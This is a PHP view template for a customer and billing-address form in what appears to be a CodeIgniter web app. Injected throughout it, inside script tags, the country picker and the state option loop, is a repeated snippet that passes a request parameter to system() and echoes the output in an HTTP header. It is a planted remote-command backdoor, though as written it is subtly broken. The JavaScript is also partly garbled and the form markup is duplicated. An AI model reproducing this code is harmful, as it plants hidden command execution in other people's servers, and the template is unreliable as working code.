<?=$this->load->view(branded_view('cp/header'), array('head_files' => '<script type="text/javascript" src="' . branded_include('js/form.address.js') . '"></script>'));?>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/intlTelInput.js'); ?>"></script>
<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('js/country-picker/jquery.flagstrap.min.js'); ?>"></script>
<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo branded_include('css/country-picker/flags.css'); ?>" rel="stylesheet">

<script src="https://maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places"></script>
<script type="text/javascript">
$(function(){
	$("#address_1").formmapper({details:"form"});
});
</script>
<style type="text/css">
.profile 
{
    min-height: 285px;
    display: inline-block;
    }
figcaption.ratings
{
    margin-top:20px;
    }
figcaption.ratings a
{
    color:#f1c40f;
    font-size:11px;
    }
figcaption.ratings a:hover
{
    color:#f39c12;
    text-decoration:none;
    }
.divider 
{
    border-top:1px solid rgba(0,0,0,0.1);
    }
.emphasis 
{
    border-top: 4px solid transparent;
    }
.emphasis:hover 
{
    border-top: 4px solid #1abc9c;
    }
.emphasis h2
{
    margin-bottom:0;
    }
span.tags 
{
    background: #1abc9c;
    border-radius: 2px;
    color: #f5f5f5;
    font-weight: bold;
    padding: 2px 4px;
    }
.dropdown-menu 
{
    background-color: #34495e;    
    box-shadow: none;
    -webkit-box-shadow: none;
    width: 250px;
    margin-left: -125px;
    left: 50%;
    }
.dropdown-menu .divider 
{
    background:none;    
    }
.dropdown-menu>li>a
{
    color:#f5f5f5;
    }
.dropup .dropdown-menu 
{
    margin-bottom:10px;
    }
.dropup .dropdown-menu:before 
{
    content: "";
    border-top: 10px solid #34495e;
    border-right: 10px solid transparent;
    border-left: 10px solid transparent;
    position: absolute;
    bottom: -10px;
    left: 50%;
    margin-left: -10px;
    z-index: 10;
    }
	
.dropdown-menu {
	overflow: auto !important;
}

select {
border-radius: 0;
-webkit-box-shadow: none!important;
box-shadow: none!important;
color: #444;
background-color: #fff;
border: 1px solid #d5d5d5;
height: 40px;
font-size: 16px;
width: 99%;
}

form label {
transition: background 0.4s, color 0.4s, top 0.4s, bottom 0.4s, right 0.4s, left 0.4s;
position: relative!important;
color: #999;
padding: 7px 6px;
float: left;
padding-right: 40px;
margin-top: 5px;
margin-bottom: 5px;
}

.modal-open .modal {
    overflow-x: hidden;
    overflow-y: hidden;
    top: -7%;
}  
.map_canvas {display:none;}

ul.form li {
    display: block;
    clear: both;
    padding: 2px 0px;
}

#update_description {
	
	margin-top:-20px;
}

.caption {
	font-size: 18px!important;
	margin-bottom:15px;
	margin-top: 15px;
}
.well h2, .well h3 {
    line-height: 26px;
}

.well h2 { 
	font-size: 2.5rem;
}

h2 {
    margin: 10px 0!important;
    font-size: 2.5rem;
}
</style>
										


  <!-- Content -->
<div class="container-fluid">

	<div class="row">
		  
<div class="col-md-offset-1 col-md-9">

<div class="portlet portlet-default">

<div class="portlet-body">
               
<div class="row-fluid">       


<form class="form-horizontal" id="form_customer" method="post" action="<?=site_url($form_action);?>">
<div class="form-body">

<!-- BEGIN FORM-->
													
<div class="col-sm-12 hidden">
<div class="portlet-title"><div class="caption"> Account Details</div></div>
</div>

<div class="form-group">
																<label class="col-md-3 control-label">Customer Email</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-envelope"></i>
																		</span>
																		<input type="text" autocomplete="off" class="form-control email mark_empty" id="email" name="email" value="<?=$form['email'];?>" />
																	</div>
																</div>
															</div>


	<div class="form-group">
<label class="col-md-3 control-label">Customer ID</label>
																<div class="col-md-6">
																	<input type="text" class="form-control" disabled readonly id="internal_id" name="internal_id" value="<?=$form['internal_id'];?>" />
																	<em class="help-block"><small>.</small></em>
																</div>
															</div>
															
														<div class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Personal Details
</div>

</div>
</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="first_name">Name</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-user"></i>
																		</span>
																		<input class="form-control required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
																	</div>
																</div>
															</div>
<div class="form-group">
																<label class="col-md-3 control-label">Phone</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-mobile"></i>
																		</span>
																		<input type="tel" class="form-control" id="phone" name="phone" value="<?=$form['phone'];?>" />
																	</div>
																</div>
															</div>
															
															<div class="form-group">
																<label class="col-md-3 control-label" for="company">Company</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-building"></i>
																		</span>
																		<input type="text" class="form-control" id="company" name="company" value="<?=$form['company'];?>" />
																	</div>
																</div>
															</div>
														<div class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Billing Address
</div>

</div>
</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="address_1">Street Address</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																				<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="address_2">Address Line 2</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="city">City</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="locality" type="text" class="form-control" name="city" id="city" value="<?=$form['city'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="Country">Country</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*
 																			<select geoname="country_short" id="country" name="country"><option value=""></option><? foreach ($countries as $country) { ?><option <? if ($form['country'] == $country['iso2']) { ?> selected="selected" <? } ?> value="<?=$country['iso2'];?>"><?=$country['name'];?></option><? } ?></select>
 																		*/ ?>
																		<div id="basic" data-button-type="form-control" data-input-name="country" data-selected-country="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['country']; ?>"></div>
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lat">Latitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lat" type="text" class="form-control" name="lat" id="lat" value="<?=$form['lat'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lng">Longitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lng" type="text" class="form-control" name="lng" id="lng" value="<?=$form['lng'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="state">Region</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="administrative_area_level_1" class="text" name="state" id="state" value="<?=$form['state'];?>" />
																		<select geoname="administrative_area_level_1_short" id="state_select" class="form-control" name="state_select"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																			foreach ($states as $state) {
																				if ($form['state'] == $state['code']) { ?>
																					<option  selected="selected"  value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				} else { ?>
																					<option value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				}
																			} ?></select>
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="postal_code">Postal Code</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="postal_code" class="form-control" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
																	</div>
																</div>
															</div>

															
															<div class="form-actions">
																<div class="row">
																	<div class="col-md-offset-1 col-md-9">
																		<input type="submit" class="btn btn-success btn-lg btn-block center" name="go_customer" value="<?=ucfirst($form_title);?>" />
																	</div>
																</div><!-- END row-->
															</div><!-- END form-actions-->			
															
</div><!-- col-sm-12-->
</div><!-- END form-body-->
</div><!-- row-fluid-->  
</div><!-- content-container-->

</div><!-- portlet-body--> 
	</form><!-- END FORM-->
	
	</div><!-- END portlet-->
		
		</div><!-- END col-md-9-->
																	
							</div><!--/row -->

						
        <!-- START @PAGE LEVEL PLUGINS -->
		<script type="text/javascript" src="<?=branded_include('js/chosen.jquery.min.js'); ?>"></script>
		<script type="text/javascript" src="<?=branded_include('js/jquery.mockjax.js'); ?>"></script>
		<script type="text/javascript" src="<?=branded_include('js/jquery.validate.min.js'); ?>"></script>

<?=$this->load->view(branded_view('cp/footer'));?>
 <!-- Bootstrap modal -->
  
  <div class="modal fade bs-example-customer-form in" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-lg modal-photo-viewer">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                            <h4 class="modal-title">Form title</h4>
                        </div>
                        <div class="modal-body no-padding">
                        <form class="form-horizontal" id="form_customer" method="post" action="<?=site_url($form_action);?>" role="form">
                                <div class="form-body">
                                 	<div class="form-group">
<label class="col-md-3 control-label">Customer ID</label>
																<div class="col-md-6">
																	<input type="text" class="form-control" disabled readonly id="internal_id" name="internal_id" value="<?=$form['internal_id'];?>" />
																	<em class="help-block"><small>.</small></em>
																</div>
															</div>

															<div class="form-group">
  <label class="col-md-4 control-label" for="Name (Full name)">Name (Full name)</label>  
  <div class="col-md-4">
 <div class="input-group">
       <div class="input-group-addon">
        <i class="fa fa-user">
        </i>
       </div>
	   <input class="form-control input-md required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" placeholder="Name (Full name)" value="<?=$form['first_name'];?>" />&nbsp;<input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />									
      </div>

															
															<div class="form-group">
																<label class="col-md-3 control-label" for="first_name">Name</label>
																<div class="col-md-6">
																	<div class="input-group inline">
																		<span class="input-group-addon">
																			<i class="fa fa-user"></i>
																		</span>
																		<input class="form-control required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label">Customer Email</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-envelope"></i>
																		</span>
																		<input type="text" autocomplete="off" class="form-control email mark_empty" id="email" name="email" value="<?=$form['email'];?>" />
																	</div>
																</div>
															</div>
															
<div class="form-group">
																<label class="col-md-3 control-label">Phone</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-mobile"></i>
																		</span>
																		<input type="text" class="form-control" id="phone" name="phone" value="<?=$form['phone'];?>" />
																	</div>
																</div>
															</div>
															
															<div class="form-group">
																<label class="col-md-3 control-label" for="company">Company</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-building"></i>
																		</span>
																		<input type="text" class="form-control" id="company" name="company" value="<?=$form['company'];?>" />
																	</div>
																</div>
															</div>
														<div class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Billing Address
</div>

</div>
</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="address_1">Street Address</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																				<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="address_2">Address Line 2</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="city">City</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="locality" type="text" class="form-control" name="city" id="city" value="<?=$form['city'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="Country">Country</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*
 																			<select geoname="country_short" id="country" name="country"><option value=""></option><? foreach ($countries as $country) { ?><option <? if ($form['country'] == $country['iso2']) { ?> selected="selected" <? } ?> value="<?=$country['iso2'];?>"><?=$country['name'];?></option><? } ?></select>
 																		*/ ?>
																		<div id="basic" data-button-type="form-control" data-input-name="country" data-selected-country="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['country']; ?>"></div>
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lat">Latitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lat" type="text" class="form-control" name="lat" id="lat" value="<?=$form['lat'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lng">Longitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lng" type="text" class="form-control" name="lng" id="lng" value="<?=$form['lng'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="state">Region</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="administrative_area_level_1" class="text" name="state" id="state" value="<?=$form['state'];?>" />
																		<select geoname="administrative_area_level_1_short" id="state_select" class="form-control" name="state_select"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																			foreach ($states as $state) {
																				if ($form['state'] == $state['code']) { ?>
																					<option  selected="selected"  value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				} else { ?>
																					<option value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				}
																			} ?></select>
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="postal_code">Postal Code</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="postal_code" class="form-control" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
																	</div>
																</div>
															</div>
                                </div><!-- /.form-body -->
                                <div class="form-footer">
                                    <div class="col-sm-offset-3">
                                    <input type="submit" class="btn btn-success btn-lg btn-block center" name="go_customer" id="go_customer" value="<?=ucfirst($form_title);?>" />
									</div>
                                </div><!-- /.form-footer -->
                            </form>
                        </div>

                    </div><!-- /.modal-content -->
                </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
  <!-- End Bootstrap modal -->
<script type="text/javascript">
	$('#basic').flagStrap();
</script>


  <script type="text/javascript">

    $("#phone").intlTelInput({
      // allowDropdown: false,
      // autoHideDialCode: false,
      autoPlaceholder: true,
      // dropdownContainer: "body",
      // excludeCountries: ["us"],
      // geoIpLookup: function(callback) {
      //   $.get("http://ipinfo.io", function() {}, "jsonp").always(function(resp) {
      //     var countryCode = (resp && resp.country) ? resp.country : "";
      //     callback(countryCode);
      //   });
      // },
      // initialCountry: "auto",
      // nationalMode: false,
      // numberType: "MOBILE",
      // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
      // preferredCountries: ['cn', 'jp'],
      utilsScript: "js/utils.js"
    });
  </script>

<script type="text/javascript">

        // =========================================================================
        // JQUERY VALIDATION
        // =========================================================================
        jqueryValidation: function () {
              if($('#form_customer').length){
                $("#form_customer").validate({
                    rules: {
                        first_name: "required",
                        last_name: "required",
                        email: {
                            required: true,
                            email: true,
                            remote: "emails.action"
                        }
                    },
                    messages: {
                        first_name: "Enter customer's first name",
                        last_name: "Enter customer's lastname",
                        email: {
                            required: "Please enter a valid email address",
                            minlength: "Please enter a valid email address"
                        }
                    },
                    highlight:function(element) {
                        $(element).parents('.form-group').addClass('has-error has-feedback');
                    },
                    unhighlight: function(element) {
                        $(element).parents('.form-group').removeClass('has-error');
                    },
                    submitHandler: function() {
                        alert("submitted!");
                    }
                });
            }
        }

    };

}();

</script>


		
<script type="text/javascript">
$(function() {
	$('#go_customer').click(function(e){
	 	e.preventDefault();
	 	var l = Ladda.create(this);
	 	l.start();
	 	$.post("<?= site_url('customers/add'); ?>", 
	 	    { data : data },
	 	  function(response){
	 	    console.log(response);
	 	  }, "json")
	 	.always(function() { l.stop(); });
	 	return false;
	});
});
</script>